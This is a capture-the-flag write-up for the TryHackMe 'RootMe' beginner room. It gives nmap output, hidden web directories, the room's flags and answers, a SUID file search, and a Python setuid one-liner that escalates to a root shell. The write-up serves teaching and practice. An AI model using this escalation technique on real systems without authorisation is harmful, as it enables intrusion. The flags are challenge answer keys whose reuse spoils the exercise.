# RootMe

A ctf for beginners, can you root me?

[RootMe](https://tryhackme.com/room/rrootme)

## Topic's

- Network Enumeration
- Web Enumeration
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Deploy the machine

Connect to TryHackMe network and deploy the machine. If you don't know how to do this, complete the OpenVPN room first.

1. Deploy the machine

`No answer needed`

## Reconnaissance

First, let's get information about the target.

```
kali@kali:~/CTFs/tryhackme/RootMe$ sudo nmap -A -Pn -sC -sV -O 10.10.16.101
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 13:09 CEST
Nmap scan report for 10.10.16.101
Host is up (0.038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/4%OT=22%CT=1%CU=36022%PV=Y%DS=2%DC=T%G=Y%TM=5F79AD9
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11
OS:NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   37.33 ms 10.8.0.1
2   37.59 ms 10.10.16.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.41 seconds
```

1. Scan the machine, how many ports are open?

`2`

2. What version of Apache are running?

`2.4.29`

3. What service is running on port 22?

`SSH`

4. Find directories on the web server using the GoBuster tool.

- [http://10.10.16.101/panel/](http://10.10.16.101/panel/)
- [http://10.10.16.101/uploads/](http://10.10.16.101/uploads/)

1. What is the hidden directory?

`/panel/`

## Getting a shell

Find a form to upload and get a reverse shell, and find the flag.

1. user.txt

`THM{y0u_g0t_a_sh3ll}`

## Privilege escalation

Now that we have a shell, let's escalate our privileges to root.

1. Search for files with SUID permission, which file is weird?

```
bash-4.4$ find / -user root -perm /4000 2> /dev/null
find / -user root -perm /4000 2> /dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

`/usr/bin/python`

2. Find a form to escalate your privileges.

`No answer needed`

3. root.txt

```
bash-4.4$ /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
#
```
